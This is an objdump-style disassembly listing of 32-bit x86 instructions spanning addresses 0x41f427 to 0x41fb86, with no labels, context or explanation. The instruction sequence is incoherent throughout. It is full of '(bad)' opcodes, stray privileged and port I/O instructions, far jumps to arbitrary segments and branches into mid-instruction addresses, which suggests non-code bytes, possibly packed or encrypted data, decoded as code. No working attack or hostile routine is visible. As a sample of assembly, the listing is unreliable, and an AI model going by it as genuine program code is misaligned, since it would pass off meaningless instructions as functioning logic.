  41f427:	outs   dx,BYTE PTR ds:[esi]
  41f428:	push   ebx
  41f429:	arpl   WORD PTR [edi],si
  41f42b:	jo     0x41f3df
  41f42d:	pusha  
  41f42e:	add    ah,BYTE PTR [edi+edi*1-0xc]
  41f432:	idiv   BYTE PTR [edi+0x16f633be]
  41f438:	stc    
  41f439:	lods   al,BYTE PTR ds:[esi]
  41f43a:	jecxz  0x41f400
  41f43c:	pop    esp
  41f43d:	and    ecx,edx
  41f43f:	js     0x41f3da
  41f441:	push   ebp
  41f442:	cli    
  41f443:	xchg   edx,eax
  41f444:	adc    BYTE PTR [ebx-0x73],ah
  41f447:	fbld   TBYTE PTR [esi]
  41f449:	add    bh,BYTE PTR ds:0x4b1f2071
  41f44f:	mov    bl,0x36
  41f451:	leave  
  41f452:	leave  
  41f453:	jmp    0x49d421f2
  41f458:	pushf  
  41f459:	jl     0x41f45d
  41f45b:	push   ecx
  41f45c:	retf   
  41f45d:	jnp    0x41f440
  41f45f:	(bad)  
  41f461:	lds    ebp,FWORD PTR [ecx+0x3a270cb6]
  41f467:	shl    BYTE PTR gs:[ebp+0x26b6608c],cl
  41f46e:	stos   BYTE PTR es:[edi],al
  41f46f:	jno    0x41f42c
  41f471:	fist   WORD PTR [ecx]
  41f473:	inc    edi
  41f474:	sbb    bl,ch
  41f476:	xchg   ebp,eax
  41f477:	test   al,0xf1
  41f479:	sbb    al,0x2
  41f47b:	add    BYTE PTR [ebx+edi*2+0x129b7789],bh
  41f482:	out    dx,eax
  41f483:	out    0x48,eax
  41f485:	jns    0x41f4fb
  41f487:	cdq    
  41f488:	jne    0x41f4f2
  41f48a:	enter  0x65bd,0xc7
  41f48e:	popf   
  41f48f:	in     al,0xb7
  41f491:	mov    esi,0x9470b73f
  41f496:	cmp    DWORD PTR [edi+0x4b662a43],esp
  41f49c:	repnz xchg edi,eax
  41f49e:	int3   
  41f49f:	pop    esp
  41f4a0:	xchg   edi,eax
  41f4a1:	mov    BYTE PTR [ebx],bh
  41f4a3:	or     BYTE PTR [ebp-0x42],bh
  41f4a6:	cli    
  41f4a7:	inc    eax
  41f4a8:	xchg   ecx,eax
  41f4a9:	adc    bl,BYTE PTR [ebp-0x3f]
  41f4ac:	jp     0x41f48e
  41f4ae:	(bad)  
  41f4af:	dec    esi
  41f4b0:	xor    DWORD PTR [esp+ecx*1],esp
  41f4b3:	and    al,0xea
  41f4b5:	ret    0x9c69
  41f4b8:	jp     0x41f50c
  41f4ba:	and    BYTE PTR [edi+0x7a05a28a],0xab
  41f4c1:	aad    0x31
  41f4c3:	ss inc edi
  41f4c5:	sub    ebp,DWORD PTR [ecx-0x2]
  41f4c8:	(bad)  
  41f4c9:	in     eax,0x7f
  41f4cb:	jle    0x41f51a
  41f4cd:	clc    
  41f4ce:	into   
  41f4cf:	das    
  41f4d0:	or     edi,ebp
  41f4d2:	sub    esi,esi
  41f4d4:	ss dec esp
  41f4d6:	pop    ebx
  41f4d7:	mov    eax,ds:0x91fad7cd
  41f4dc:	test   BYTE PTR [esi],ah
  41f4de:	or     esp,DWORD PTR [ebx+0x23dcd530]
  41f4e4:	scas   eax,DWORD PTR es:[edi]
  41f4e5:	pop    edi
  41f4e6:	mov    BYTE PTR [ecx+esi*8-0x41c5387c],ah
  41f4ed:	sbb    ecx,DWORD PTR [edx+0x15]
  41f4f0:	and    bh,BYTE PTR [edx-0x62]
  41f4f3:	(bad)  
  41f4f4:	clc    
  41f4f5:	das    
  41f4f6:	arpl   dx,ax
  41f4f8:	add    al,0x3f
  41f4fa:	jg     0x41f4be
  41f4fc:	mov    al,0x89
  41f4fe:	iret   
  41f4ff:	xor    al,0x11
  41f501:	int3   
  41f502:	mov    eax,edx
  41f504:	sahf   
  41f505:	rol    edx,0xd0
  41f508:	pusha  
  41f509:	cmp    eax,eax
  41f50b:	jecxz  0x41f55d
  41f50d:	ret    0xe82f
  41f510:	mov    ss,WORD PTR ds:0xfe50cdfb
  41f516:	add    ecx,edi
  41f518:	jae    0x41f55b
  41f51a:	sbb    eax,0x246c3a69
  41f51f:	cmp    al,0x51
  41f521:	mov    ds:0xa51508ec,al
  41f526:	cmp    DWORD PTR [edx],esp
  41f528:	aad    0x90
  41f52a:	cwde   
  41f52b:	dec    esp
  41f52c:	dec    edi
  41f52d:	adc    eax,0x47cf94de
  41f532:	inc    edx
  41f533:	fmulp  st(5),st
  41f535:	mov    eax,ds:0xa82a760
  41f53a:	inc    edi
  41f53b:	cld    
  41f53c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f53d:	stos   DWORD PTR es:[edi],eax
  41f53e:	shr    DWORD PTR [edi],0xf3
  41f541:	test   esp,ebx
  41f543:	jae    0x41f5be
  41f545:	xchg   esp,eax
  41f546:	jmp    0x41f54c
  41f548:	or     BYTE PTR [edi],bl
  41f54a:	out    0x2,al
  41f54c:	sub    BYTE PTR [esi],dl
  41f54e:	mov    edx,0xfc22afde
  41f553:	in     eax,dx
  41f554:	imul   ecx,DWORD PTR [ecx-0x31],0xffffffde
  41f558:	in     al,dx
  41f559:	mov    ebp,DWORD PTR [eax-0x64]
  41f55c:	or     eax,0x21ad04cd
  41f561:	add    ah,al
  41f563:	or     al,0x1b
  41f565:	sub    al,0x14
  41f567:	in     al,0xd6
  41f569:	and    DWORD PTR [ebp+0x5fefd2d8],ecx
  41f56f:	loop   0x41f59d
  41f571:	imul   ecx,DWORD PTR [ecx-0x15],0x77
  41f575:	mov    ds:0x7d6e8185,al
  41f57a:	xlat   BYTE PTR ds:[ebx]
  41f57b:	and    eax,0xcc11c353
  41f580:	jmp    0xdd743e7d
  41f585:	in     eax,dx
  41f586:	stos   BYTE PTR es:[edi],al
  41f587:	xchg   BYTE PTR ds:0x9ba11fb9,al
  41f58d:	adc    edx,ecx
  41f58f:	inc    ebx
  41f590:	(bad)  
  41f591:	shl    DWORD PTR [esi+edi*4],0x88
  41f595:	or     DWORD PTR [edi+eiz*4+0x1457d2df],0x10
  41f59d:	stos   BYTE PTR es:[edi],al
  41f59e:	inc    esp
  41f59f:	outs   dx,BYTE PTR ds:[esi]
  41f5a0:	pop    ebp
  41f5a1:	rcl    DWORD PTR [ebp-0x64],0xee
  41f5a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5a6:	mov    eax,ss:0x31513be0
  41f5ac:	in     al,dx
  41f5ad:	xor    eax,0xfc169995
  41f5b2:	cdq    
  41f5b3:	xchg   edi,eax
  41f5b4:	int3   
  41f5b5:	push   ss
  41f5b6:	mov    bh,0x44
  41f5b8:	popa   
  41f5b9:	sub    eax,0x73eebff7
  41f5be:	add    eax,0xe2ed7289
  41f5c3:	push   cs
  41f5c4:	rol    ah,1
  41f5c6:	sti    
  41f5c7:	jns    0x41f5f1
  41f5c9:	mov    al,ds:0x7e2e2523
  41f5ce:	nop
  41f5cf:	ja     0x41f5e3
  41f5d1:	cwde   
  41f5d2:	mov    edx,0x54d7f2c2
  41f5d7:	xchg   DWORD PTR [eax-0x3],eax
  41f5da:	xchg   esp,eax
  41f5db:	mov    ecx,DWORD PTR [edi+0x44]
  41f5de:	loope  0x41f57f
  41f5e0:	sub    BYTE PTR [esi-0x6f4d1e9a],al
  41f5e6:	clc    
  41f5e7:	xchg   DWORD PTR [eax-0x6170dbdd],ecx
  41f5ed:	les    esi,FWORD PTR [edi-0x27]
  41f5f0:	inc    esi
  41f5f1:	dec    ecx
  41f5f2:	jle    0x41f5dd
  41f5f4:	xchg   esp,eax
  41f5f5:	rcr    ch,cl
  41f5f7:	cmp    BYTE PTR [esi+0x3c0b2b9d],0xca
  41f5fe:	pop    ebp
  41f5ff:	fwait
  41f600:	mov    eax,ds:0x8efe57cb
  41f605:	arpl   WORD PTR [edi+0x34],dx
  41f608:	inc    BYTE PTR [ebx+0x7e87f06a]
  41f60e:	cld    
  41f60f:	inc    ecx
  41f610:	aad    0x36
  41f612:	inc    esp
  41f613:	adc    al,0x77
  41f615:	jp     0x41f63f
  41f617:	xchg   esi,eax
  41f618:	jae    0x41f64f
  41f61a:	mov    eax,0xa0213ca0
  41f61f:	clc    
  41f620:	dec    eax
  41f621:	sub    eax,0x905fc584
  41f626:	fwait
  41f627:	les    edi,FWORD PTR [edi-0x47]
  41f62a:	cmc    
  41f62b:	add    BYTE PTR ss:[esi+0xa],0x1f
  41f630:	ins    DWORD PTR es:[edi],dx
  41f631:	test   BYTE PTR [edi+0x2d],dl
  41f634:	xor    eax,0x9f4716bb
  41f639:	adc    al,0x31
  41f63b:	jbe    0x41f5d8
  41f63d:	dec    eax
  41f63e:	ret    
  41f63f:	add    BYTE PTR [eax+0x1d63e55e],ah
  41f645:	test   eax,0xa3eb9143
  41f64a:	popa   
  41f64b:	outs   dx,DWORD PTR ds:[esi]
  41f64c:	(bad)  
  41f64d:	mov    edx,DWORD PTR [ebx+0x7dda632c]
  41f653:	jecxz  0x41f637
  41f655:	add    esp,DWORD PTR [ebp-0x2a669f19]
  41f65b:	or     al,0x1b
  41f65d:	iret   
  41f65e:	jb     0x41f623
  41f660:	sub    BYTE PTR ds:0x254b773a,ch
  41f666:	and    DWORD PTR [edx],ecx
  41f668:	pop    esp
  41f669:	dec    esi
  41f66a:	test   ebx,esp
  41f66c:	adc    edx,DWORD PTR [edx+0x11]
  41f66f:	popa   
  41f670:	out    0x52,eax
  41f672:	in     al,0xb1
  41f674:	addr16 inc ebx
  41f676:	dec    edx
  41f677:	ret    
  41f678:	cmp    eax,0xd777cbb9
  41f67d:	retf   0x1c02
  41f680:	xchg   DWORD PTR [edx],ebp
  41f682:	push   edi
  41f683:	xor    DWORD PTR gs:[ebx],ebx
  41f686:	inc    esi
  41f687:	adc    ch,ah
  41f689:	mov    bh,0xe3
  41f68b:	mov    eax,ds:0xedab5006
  41f690:	or     ah,BYTE PTR [eax-0xb020066]
  41f696:	sbb    dl,BYTE PTR [edx-0x5617ae47]
  41f69c:	pop    es
  41f69d:	inc    eax
  41f69e:	clc    
  41f69f:	in     al,0xdd
  41f6a1:	iret   
  41f6a2:	out    0x38,eax
  41f6a4:	es fwait
  41f6a6:	sub    al,BYTE PTR [edi+0x6bd9be13]
  41f6ac:	pop    esp
  41f6ad:	mov    ch,0x42
  41f6af:	jmp    0xdbe1c41d
  41f6b4:	rol    DWORD PTR [ecx-0x72],cl
  41f6b7:	fxch   st(4)
  41f6b9:	call   0xdae7e47f
  41f6be:	mov    al,0xe7
  41f6c0:	sub    bh,ah
  41f6c2:	sub    DWORD PTR [edx+0x60],edx
  41f6c5:	nop
  41f6c6:	icebp  
  41f6c7:	jbe    0x41f739
  41f6c9:	dec    edx
  41f6ca:	jno    0x41f6d7
  41f6cc:	(bad)  
  41f6cd:	cmp    ch,BYTE PTR [ecx]
  41f6cf:	mov    ebp,0x8799f1a7
  41f6d4:	imul   ebx,DWORD PTR [edi+ebx*4-0x3f51e43d],0x67
  41f6dc:	in     al,0x47
  41f6de:	cmc    
  41f6df:	jecxz  0x41f715
  41f6e1:	call   0xc6ce23cf
  41f6e6:	xor    eax,0x5c55d45b
  41f6eb:	inc    ebp
  41f6ec:	(bad)  
  41f6ed:	(bad)  
  41f6ee:	aam    0x3f
  41f6f0:	aam    0x3d
  41f6f2:	push   eax
  41f6f3:	mov    bl,0xf9
  41f6f5:	mov    WORD PTR [ebx-0x44],ss
  41f6f8:	add    al,0x8d
  41f6fa:	sti    
  41f6fb:	cmp    al,0xac
  41f6fd:	inc    eax
  41f6fe:	out    dx,eax
  41f6ff:	into   
  41f700:	iret   
  41f701:	dec    DWORD PTR [eax-0x66]
  41f704:	das    
  41f705:	loop   0x41f75a
  41f707:	xor    al,0x9c
  41f709:	add    al,0x47
  41f70b:	pop    ecx
  41f70c:	mov    bh,0x15
  41f70e:	aad    0x79
  41f710:	mov    bh,0x90
  41f712:	jns    0x41f6d1
  41f714:	pushf  
  41f715:	xor    DWORD PTR [edi-0x66f3f1e1],0x2937d968
  41f71f:	test   al,0xa3
  41f721:	les    ebp,FWORD PTR [esi]
  41f723:	inc    esi
  41f724:	push   esi
  41f725:	scas   eax,DWORD PTR es:[edi]
  41f726:	adc    bl,BYTE PTR [ebx-0x6d]
  41f729:	(bad)  
  41f72a:	retf   0x1903
  41f72d:	int3   
  41f72e:	cmp    eax,DWORD PTR [esi+0x5facc271]
  41f734:	xor    eax,0x8faf70ec
  41f739:	in     al,dx
  41f73a:	jl     0x41f71c
  41f73c:	in     eax,dx
  41f73d:	adc    dl,bh
  41f73f:	(bad)  
  41f740:	push   0xbdb7e46e
  41f745:	mov    bh,0xd1
  41f747:	or     ah,0xc4
  41f74a:	xchg   ecx,eax
  41f74b:	test   eax,0x6f01b025
  41f750:	jmp    0xd849:0xcca51f3b
  41f757:	dec    ecx
  41f758:	out    0x88,eax
  41f75a:	push   0x72a9e084
  41f75f:	loopne 0x41f768
  41f761:	fimul  DWORD PTR [esi+0x2d673da5]
  41f767:	xchg   ebp,eax
  41f768:	jbe    0x41f71e
  41f76a:	xchg   BYTE PTR [edx],bh
  41f76c:	out    dx,al
  41f76d:	dec    DWORD PTR [edx]
  41f76f:	repnz push ecx
  41f771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f772:	js     0x41f79d
  41f774:	inc    ecx
  41f775:	dec    esi
  41f776:	jbe    0x41f711
  41f778:	dec    eax
  41f779:	xor    BYTE PTR [ebx+0x57],bl
  41f77c:	ret    
  41f77d:	xlat   BYTE PTR ds:[ebx]
  41f77e:	shl    DWORD PTR [edi],1
  41f780:	fld    QWORD PTR [ebp+0x42]
  41f783:	xchg   esp,eax
  41f784:	jns    0x41f7dd
  41f786:	pop    esp
  41f787:	les    edx,FWORD PTR [ebx-0x2eb7c82]
  41f78d:	ret    
  41f78e:	ret    0x6b70
  41f791:	shr    bh,cl
  41f793:	mov    cl,0xd9
  41f795:	fiadd  WORD PTR [ebx+0x2b]
  41f798:	fwait
  41f799:	add    ah,BYTE PTR [ebx+0x79]
  41f79c:	aam    0x31
  41f79e:	imul   edx,DWORD PTR [ecx+0x14],0xf490e1c2
  41f7a5:	out    dx,eax
  41f7a6:	repz dec eax
  41f7a8:	clc    
  41f7a9:	leave  
  41f7aa:	mov    DWORD PTR [edi+0x60],ebp
  41f7ad:	data16 mov bl,0x90
  41f7b0:	mov    eax,0xfe902e0b
  41f7b5:	call   0x6c23:0xed5c617e
  41f7bc:	stc    
  41f7bd:	mov    ah,0xd
  41f7bf:	lds    ecx,FWORD PTR [edi-0x11383c73]
  41f7c5:	mov    bh,0x93
  41f7c7:	ror    edi,0x18
  41f7ca:	inc    esi
  41f7cb:	les    edi,FWORD PTR [edx-0x6740588f]
  41f7d1:	or     DWORD PTR [esi-0x2],ebx
  41f7d4:	test   al,0x3c
  41f7d6:	push   edi
  41f7d7:	push   eax
  41f7d8:	add    DWORD PTR [edx+esi*8],ebx
  41f7db:	and    ebp,DWORD PTR [eax]
  41f7dd:	out    dx,eax
  41f7de:	sub    dh,bl
  41f7e0:	rcl    DWORD PTR [ecx+0x58],0x3f
  41f7e4:	push   eax
  41f7e5:	mov    bl,0x38
  41f7e7:	pop    edi
  41f7e8:	or     ch,bh
  41f7ea:	add    al,0x3
  41f7ec:	mov    BYTE PTR [ecx+0x62],ah
  41f7ef:	jp     0x41f7fc
  41f7f1:	(bad)  
  41f7f2:	sub    DWORD PTR [esp+esi*8-0x44],esi
  41f7f6:	stc    
  41f7f7:	dec    esi
  41f7f8:	pop    ebx
  41f7f9:	mov    edx,0xfbeb39b9
  41f7fe:	push   edx
  41f7ff:	cld    
  41f800:	hlt    
  41f801:	shl    esi,1
  41f803:	sub    DWORD PTR [eax-0x5b3c5e95],edx
  41f809:	sbb    DWORD PTR [esi],eax
  41f80b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f80c:	mov    eax,DWORD PTR [edx+eiz*4]
  41f80f:	push   es
  41f810:	and    BYTE PTR [ecx+0x45],dl
  41f813:	(bad)  [esi-0xf4387a8]
  41f819:	push   cs
  41f81a:	dec    edi
  41f81b:	aam    0xe8
  41f81d:	jno    0x41f870
  41f81f:	push   esp
  41f820:	jl     0x41f88e
  41f822:	push   esp
  41f823:	pusha  
  41f824:	mov    eax,0xa8339a22
  41f829:	loopne 0x41f7ec
  41f82b:	sbb    al,0x43
  41f82d:	in     eax,dx
  41f82e:	rcl    ah,1
  41f830:	shr    esi,1
  41f832:	cmp    DWORD PTR [ecx],0xade187e7
  41f838:	(bad)  
  41f839:	scas   eax,DWORD PTR es:[edi]
  41f83a:	mov    dl,0xde
  41f83c:	add    DWORD PTR [ecx-0x4b],ebx
  41f83f:	inc    esp
  41f840:	js     0x41f857
  41f842:	pop    ss
  41f843:	dec    ecx
  41f844:	enter  0x15ea,0x91
  41f848:	sti    
  41f849:	mov    ds:0xcf896b6d,eax
  41f84e:	popa   
  41f84f:	ds mov dl,0x35
  41f852:	or     al,bl
  41f854:	push   ss
  41f855:	fcmovb st,st(6)
  41f857:	push   cs
  41f858:	jp     0x41f8ce
  41f85a:	(bad)  
  41f85b:	and    BYTE PTR [esi+0x71],cl
  41f85e:	mov    ah,0xbb
  41f860:	call   DWORD PTR [eax+ecx*4]
  41f863:	rcl    al,1
  41f865:	inc    ebx
  41f866:	je     0x41f83b
  41f868:	push   edx
  41f869:	pop    ebp
  41f86a:	out    dx,eax
  41f86b:	push   0x70
  41f86d:	repnz fstp DWORD PTR ds:[eax]
  41f871:	cwde   
  41f872:	sbb    al,0xc9
  41f874:	(bad)  
  41f876:	fwait
  41f877:	stc    
  41f878:	add    BYTE PTR [ecx-0x67],ah
  41f87b:	jns    0x41f85b
  41f87d:	shl    DWORD PTR [ecx-0x1bf4b92b],cl
  41f883:	retf   0x9527
  41f886:	loop   0x41f88d
  41f888:	cwde   
  41f889:	jne    0x41f828
  41f88b:	test   BYTE PTR [ebx+0x4],0x85
  41f88f:	fisttp WORD PTR [ecx+0x4d]
  41f892:	(bad)  [edi+0x55]
  41f895:	xor    DWORD PTR [edi],ebx
  41f897:	add    dh,BYTE PTR cs:[edx-0x35]
  41f89b:	or     BYTE PTR [ebx],0x5b
  41f89e:	ins    BYTE PTR es:[edi],dx
  41f89f:	xchg   ebp,eax
  41f8a0:	mov    esp,0x9d272d4c
  41f8a5:	bnd ret 0x5442
  41f8a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8aa:	xor    BYTE PTR [ebx-0x107a4297],dl
  41f8b0:	mov    dl,0xb0
  41f8b2:	and    bh,dh
  41f8b4:	mov    edx,0x8feb2e92
  41f8b9:	js     0x41f85a
  41f8bb:	jns    0x41f926
  41f8bd:	sbb    al,0xdb
  41f8bf:	dec    ecx
  41f8c0:	add    ecx,DWORD PTR [edx-0x7de041c5]
  41f8c6:	xor    ebp,DWORD PTR [eax]
  41f8c8:	xchg   edi,eax
  41f8c9:	and    BYTE PTR [ebx],0x5b
  41f8cc:	cmp    BYTE PTR [esi],al
  41f8ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8cf:	out    dx,al
  41f8d0:	push   ecx
  41f8d1:	pop    ds
  41f8d2:	in     al,dx
  41f8d3:	and    BYTE PTR [edi],dh
  41f8d5:	cwde   
  41f8d6:	cmp    edi,DWORD PTR [edx]
  41f8d8:	sbb    BYTE PTR [edi-0x1c7ab178],0xd8
  41f8df:	mov    dh,0xb2
  41f8e1:	test   bl,dh
  41f8e3:	test   eax,0xedcd9628
  41f8e8:	sti    
  41f8e9:	sub    esi,ebp
  41f8eb:	in     eax,0x9e
  41f8ed:	mov    dl,0x7c
  41f8ef:	lea    edi,[eax-0x376bd937]
  41f8f5:	mov    ah,0x57
  41f8f7:	or     ch,BYTE PTR [eax-0x586f168]
  41f8fd:	aam    0xae
  41f8ff:	sahf   
  41f900:	lods   eax,DWORD PTR ds:[si]
  41f902:	bound  ebx,QWORD PTR [edx+0x69540152]
  41f908:	inc    esp
  41f909:	out    dx,al
  41f90a:	ja     0x41f8c3
  41f90c:	fnstsw WORD PTR [ecx-0x131158b0]
  41f912:	ins    DWORD PTR es:[edi],dx
  41f913:	(bad)  
  41f914:	and    eax,0x9476022c
  41f919:	call   0xeec3:0x708765a3
  41f920:	inc    eax
  41f921:	fcom   st(5)
  41f923:	sbb    dh,BYTE PTR ds:0x2f70e04d
  41f929:	sbb    edi,DWORD PTR [edx-0xc]
  41f92c:	mov    eax,ds:0x15078929
  41f931:	sbb    ebx,DWORD PTR [esi+0x2f1887c2]
  41f937:	xchg   ecx,eax
  41f938:	sub    BYTE PTR [edx+0x68],al
  41f93b:	mov    DWORD PTR [edi-0x1271ae4a],edx
  41f941:	inc    esi
  41f942:	jae    0x41f92a
  41f944:	daa    
  41f945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f946:	jo     0x41f970
  41f948:	xchg   ebp,eax
  41f949:	push   ds
  41f94a:	sub    BYTE PTR [esi],ch
  41f94c:	call   0x2f68:0x2f3cda15
  41f953:	ja     0x41f976
  41f955:	cwde   
  41f956:	dec    edi
  41f957:	pop    es
  41f958:	dec    edi
  41f959:	jae    0x41f9c3
  41f95b:	xchg   ecx,eax
  41f95c:	popa   
  41f95d:	jae    0x41f9d6
  41f95f:	sbb    ebx,DWORD PTR [edx+0x6f]
  41f962:	jo     0x41f911
  41f964:	add    BYTE PTR es:[edx+0x2f],dh
  41f968:	xchg   DWORD PTR [eax+eax*1+0x5b],edi
  41f96c:	mov    ecx,edi
  41f96e:	dec    ebx
  41f96f:	mov    cl,0x4c
  41f971:	xchg   ebx,eax
  41f972:	call   0xf023:0x358351a8
  41f979:	iret   
  41f97a:	rcr    BYTE PTR [ecx+ecx*1-0x77],cl
  41f97e:	cmp    cl,dl
  41f980:	inc    esp
  41f981:	inc    ebp
  41f982:	fisub  DWORD PTR [edx+0x8060894]
  41f988:	jg     0x41f98c
  41f98a:	or     eax,0x865a265e
  41f98f:	rcr    bl,0xe8
  41f992:	pushf  
  41f993:	pushf  
  41f994:	lods   eax,DWORD PTR ds:[esi]
  41f995:	(bad)  
  41f996:	adc    al,0xf0
  41f998:	iret   
  41f999:	jmp    0x3573:0xc424d7a9
  41f9a0:	je     0x41fa13
  41f9a2:	call   0x2e5390cb
  41f9a7:	or     ch,BYTE PTR [edi-0x42]
  41f9aa:	test   BYTE PTR [edi+0x19ff16a7],dh
  41f9b0:	test   DWORD PTR [ebp+0x30],ebp
  41f9b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9b4:	mov    fs,ecx
  41f9b6:	mov    dl,BYTE PTR [ebx-0x36]
  41f9b9:	addr16 mov cl,0x2b
  41f9bc:	add    ebx,DWORD PTR [esi+0x55d2c84f]
  41f9c2:	sar    BYTE PTR [ebx-0x7371bd8a],0x37
  41f9c9:	jb     0x41fa39
  41f9cb:	sub    al,0x69
  41f9cd:	dec    edi
  41f9ce:	mov    esi,0xa69520a2
  41f9d3:	push   eax
  41f9d4:	arpl   WORD PTR [esi+0x53],si
  41f9d7:	xchg   DWORD PTR [esi],eax
  41f9d9:	fild   DWORD PTR [edx+0x4885aa3a]
  41f9df:	and    al,BYTE PTR [ecx+0x1]
  41f9e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9e3:	push   edi
  41f9e4:	(bad)  
  41f9e5:	lds    esi,FWORD PTR [ebx-0x58]
  41f9e8:	jmp    0x41fa44
  41f9ea:	xor    al,cl
  41f9ec:	test   DWORD PTR [eax+0x21be70c5],esi
  41f9f2:	nop
  41f9f3:	sub    edx,DWORD PTR [ecx+0x5f1071e1]
  41f9f9:	in     eax,0xd8
  41f9fb:	mov    dh,0xf
  41f9fd:	pop    edi
  41f9fe:	or     edi,ebx
  41fa00:	mov    edi,0x5acd3ab6
  41fa05:	cs push ebp
  41fa07:	call   0xdd3145a9
  41fa0c:	dec    esi
  41fa0d:	xor    BYTE PTR [ebx+0x483e5152],al
  41fa13:	test   DWORD PTR [edi],edi
  41fa15:	int    0x1b
  41fa17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa18:	and    ebx,DWORD PTR [eax]
  41fa1a:	pop    esp
  41fa1b:	dec    esi
  41fa1c:	jb     0x41fa15
  41fa1e:	mov    ch,dl
  41fa20:	stc    
  41fa21:	jnp    0x41fa07
  41fa23:	or     ecx,ebp
  41fa25:	loop   0x41fa07
  41fa27:	dec    esp
  41fa28:	(bad)  
  41fa29:	rol    DWORD PTR [edi+0x32],0xf0
  41fa2d:	repnz out 0xc1,eax
  41fa30:	(bad)  
  41fa31:	cmp    al,0x4c
  41fa33:	mov    bl,0x5e
  41fa35:	ss mov bh,0x84
  41fa38:	ss mov bl,0xb4
  41fa3b:	inc    esi
  41fa3c:	mov    ebx,0x222a9f2a
  41fa41:	outs   dx,BYTE PTR ds:[esi]
  41fa42:	pop    esp
  41fa43:	stos   DWORD PTR es:[edi],eax
  41fa44:	xlat   BYTE PTR ds:[ebx]
  41fa45:	or     DWORD PTR fs:[ecx-0x65],ecx
  41fa49:	shl    BYTE PTR [ecx-0xc],cl
  41fa4c:	(bad)  
  41fa4e:	test   DWORD PTR [ebp+esi*1+0xd],0x63cec627
  41fa56:	pop    ss
  41fa57:	mov    esi,0xb2cce967
  41fa5c:	xchg   esp,eax
  41fa5d:	jmp    0xd83:0xf876f313
  41fa64:	scas   eax,DWORD PTR es:[edi]
  41fa65:	mov    ds:0x4647fe01,eax
  41fa6a:	std    
  41fa6b:	sbb    DWORD PTR [ebx+0x29],ebp
  41fa6e:	mov    eax,0x6b4bb854
  41fa73:	mov    ebx,0xa50d163
  41fa78:	jmp    0x41fad3
  41fa7a:	inc    ebp
  41fa7b:	jns    0x41fac4
  41fa7d:	pop    edi
  41fa7e:	pop    ebp
  41fa7f:	jmp    0x332:0xfc5c278b
  41fa86:	or     DWORD PTR [esi],0x14d5be5b
  41fa8c:	scas   eax,DWORD PTR es:[edi]
  41fa8d:	leave  
  41fa8e:	lds    ebp,FWORD PTR [eax-0x73]
  41fa91:	dec    ebp
  41fa92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa93:	and    al,0x81
  41fa95:	cmp    al,0xdc
  41fa97:	les    ebp,FWORD PTR [eax+ecx*4+0x40]
  41fa9b:	mov    ecx,0x90542115
  41faa0:	fnsave [edx]
  41faa2:	jle    0x41fb13
  41faa4:	out    0x18,al
  41faa6:	or     al,ch
  41faa8:	ja     0x41fac8
  41faaa:	push   edx
  41faab:	scas   eax,DWORD PTR es:[edi]
  41faac:	outs   dx,BYTE PTR ds:[esi]
  41faad:	inc    ebp
  41faae:	dec    ecx
  41faaf:	jae    0x41fa41
  41fab1:	sbb    esp,DWORD PTR [eax]
  41fab3:	cld    
  41fab4:	mov    ebx,0x9e29f26a
  41fab9:	rep lods eax,DWORD PTR ds:[esi]
  41fabb:	cmp    al,0x17
  41fabd:	aas    
  41fabe:	dec    edx
  41fabf:	nop
  41fac0:	push   cs
  41fac1:	cmp    al,0x9d
  41fac3:	push   ebx
  41fac4:	mov    eax,ds:0xde1926bb
  41fac9:	pusha  
  41faca:	(bad)  
  41facb:	mov    ds:0xbe9c4f29,al
  41fad0:	push   0x4689679e
  41fad5:	push   ebx
  41fad6:	dec    edx
  41fad7:	bound  edi,QWORD PTR [esi+0x42]
  41fada:	cmp    al,0xf9
  41fadc:	jo     0x41fa99
  41fade:	mov    al,ds:0x3a77af88
  41fae3:	xor    DWORD PTR [esi+0x6465b618],ebx
  41fae9:	dec    eax
  41faea:	cs (bad) 
  41faec:	cdq    
  41faed:	imul   ebx,DWORD PTR [edi+edi*8+0x26fb36ca],0xd3e17a1e
  41faf8:	cdq    
  41faf9:	sti    
  41fafa:	hlt    
  41fafb:	and    BYTE PTR [edx+0x768cc437],bl
  41fb01:	xchg   ebp,eax
  41fb02:	(bad)  
  41fb04:	add    eax,0xf5baec6
  41fb09:	cmc    
  41fb0a:	xchg   ecx,eax
  41fb0b:	inc    edx
  41fb0c:	sbb    eax,0xd0bfab4b
  41fb11:	inc    edx
  41fb12:	rcr    BYTE PTR [ebp+0x5367143e],1
  41fb18:	jns    0x41fafa
  41fb1a:	fisubr WORD PTR [eax+edx*2]
  41fb1d:	inc    esi
  41fb1e:	mov    esp,0xe974596a
  41fb23:	ror    BYTE PTR [edx],cl
  41fb25:	inc    edx
  41fb26:	(bad)  
  41fb27:	icebp  
  41fb28:	and    esi,DWORD PTR [edi]
  41fb2a:	mov    edi,0xf829ebd8
  41fb2f:	or     DWORD PTR [ebx+eax*4-0x32],edi
  41fb33:	mov    edx,0x4bbe9ea
  41fb38:	and    BYTE PTR [edx+0x5d],ch
  41fb3b:	nop
  41fb3c:	shr    BYTE PTR [ecx+esi*1],0x85
  41fb40:	mov    ecx,0x5c33fbe1
  41fb45:	sbb    ah,BYTE PTR [ebp-0x26756dfa]
  41fb4b:	std    
  41fb4c:	push   cs
  41fb4d:	mov    WORD PTR [eax-0x56],es
  41fb50:	mov    DWORD PTR [eax*1-0x741ecc74],edx
  41fb57:	mov    cs:0xda7462d8,al
  41fb5d:	xor    ebx,ebp
  41fb5f:	jmp    0x51c3:0xc724e22
  41fb66:	pop    DWORD PTR [ebx+0x4a]
  41fb69:	int3   
  41fb6a:	mov    edx,0x58e7828c
  41fb6f:	pop    ebp
  41fb70:	xor    DWORD PTR [edi+ecx*1],esp
  41fb73:	dec    esp
  41fb74:	in     al,dx
  41fb75:	out    dx,eax
  41fb76:	ins    BYTE PTR es:[edi],dx
  41fb77:	call   0x833ed94f
  41fb7c:	sub    eax,0x20714416
  41fb81:	addr16 ds popf 
  41fb84:	aas    
  41fb85:	aas    
  41fb86:	popa   
